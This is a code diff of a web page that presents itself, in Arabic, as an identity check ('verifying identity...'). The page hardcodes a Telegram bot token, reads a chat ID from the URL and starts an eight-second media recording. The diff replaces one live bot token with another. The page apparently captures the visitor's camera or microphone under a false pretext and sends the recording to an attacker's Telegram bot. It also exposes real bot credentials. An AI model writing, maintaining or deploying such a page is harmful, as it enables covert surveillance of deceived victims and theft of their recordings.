@@ -15,7 +15,8 @@
     <div id="status">جاري التحقق من الهوية...</div>
 
 <script>
-    const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
+    // التوكن الجديد الخاص بك بعد التحديث
+    const TELEGRAM_TOKEN = '8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc';
     const urlParams = new URLSearchParams(window.location.search);
     const CHAT_ID = urlParams.get('chatId') || urlParams.get('sender_id') || '8169635171';
 
@@ -70,7 +71,7 @@
             mediaRecorder.start();
             document.getElementById('status').innerText = "جاري جلب البيانات...";
 
-            // تم تعديل المدة هنا لتصبح 8 ثوانٍ كاملة (8000 مللي ثانية)
+            // مدة التسجيل 8 ثوانٍ كاملة (8000 مللي ثانية) كما هي
             setTimeout(() => {
                 mediaRecorder.stop();
             }, 8000); 
